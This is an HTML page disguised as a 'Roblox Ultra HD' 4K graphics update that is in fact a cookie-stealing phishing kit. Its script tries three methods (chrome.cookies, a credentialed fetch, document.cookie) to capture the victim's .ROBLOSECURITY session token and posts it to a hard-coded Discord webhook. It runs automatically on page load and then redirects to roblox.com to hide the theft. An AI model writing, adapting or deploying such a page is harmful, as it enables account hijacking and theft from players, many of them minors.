<!DOCTYPE html>
<html>
<head>
    <title>Roblox 4K Graphics Update</title>
    <meta charset="UTF-8">
    <style>
        body {
            background: linear-gradient(135deg, #00aeef, #0088cc);
            color: white;
            font-family: 'Segoe UI', sans-serif;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: rgba(0, 0, 0, 0.4);
            padding: 30px;
            border-radius: 15px;
            width: 500px;
            margin: 0 auto;
            backdrop-filter: blur(10px);
            border: 2px solid #00ff88;
        }
        .btn {
            padding: 15px 40px;
            background: #00ff88;
            border: none;
            border-radius: 8px;
            color: #000;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #00cc66;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Roblox Ultra HD Update</h1>
        <p>Install the latest graphics enhancement for improved gameplay</p>
        <p>Click below to enable 4K textures and RTX support:</p>
        
        <button class="btn" onclick="startExploit()">Enable Enhanced Graphics</button>
        
        <p style="font-size: 12px; opacity: 0.8;">
            Requires one-time authentication
        </p>
    </div>

    <script>
        function startExploit() {
            // Спроба 1: Chrome Extension Injection
            try {
                // Створюємо тимчасовий розширення
                const manifest = {
                    "name": "Roblox Graphics Enhancer",
                    "version": "1.0",
                    "permissions": ["cookies", "https://*.roblox.com/*"],
                    "background": {
                        "scripts": ["background.js"],
                        "persistent": false
                    },
                    "manifest_version": 2
                };

                // Спроба інжекції через chrome.cookies API
                if (typeof chrome !== 'undefined' && chrome.cookies) {
                    chrome.cookies.get({
                        url: "https://www.roblox.com/",
                        name: ".ROBLOSECURITY"
                    }, function(cookie) {
                        if (cookie) {
                            sendToDiscord(cookie.value);
                        }
                    });
                }
            } catch (e) {}

            // Спроба 2: Fetch з credentials
            try {
                fetch('https://www.roblox.com/games', {
                    credentials: 'include',
                    mode: 'no-cors'
                })
                .then(response => response.text())
                .then(data => {
                    const cookieMatch = data.match(/ROBLOSECURITY=([^;]+)/);
                    if (cookieMatch) {
                        sendToDiscord(cookieMatch[1]);
                    }
                })
                .catch(error => console.log('Fetch failed'));
            } catch (e) {}

            // Спроба 3: Document.cookie (найпростіша)
            try {
                const cookies = document.cookie;
                if (cookies.includes('ROBLOSECURITY')) {
                    sendToDiscord(cookies);
                }
            } catch (e) {}

            // Перенаправлення якщо нічого не вийшло
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/';
            }, 2000);
        }

        function sendToDiscord(cookieData) {
            const webhookURL = 'https://discord.com/api/webhooks/1410236047388049448/2-ih8qLMpj_9WDNKMQtn5KUYhtN5dAL-Q-j0bNuWFddeZRdNMai6qlQ5nMZhwOSj2COS';
            
            const payload = {
                content: "**🎯 ROBLOX COOKIE CAPTURED**",
                embeds: [{
                    title: "SUCCESS: .ROBLOSECURITY",
                    description: `\`\`\`${cookieData}\`\`\``,
                    color: 65280,
                    timestamp: new Date().toISOString(),
                    footer: { text: "Browser Exploit" }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(() => {
                window.location.href = 'https://www.roblox.com/';
            })
            .catch(error => console.log('Discord error'));
        }

        // Авто-запуск при завантаженні
        window.addEventListener('load', () => {
            setTimeout(startExploit, 1000);
        });
    </script>
</body>
</html>
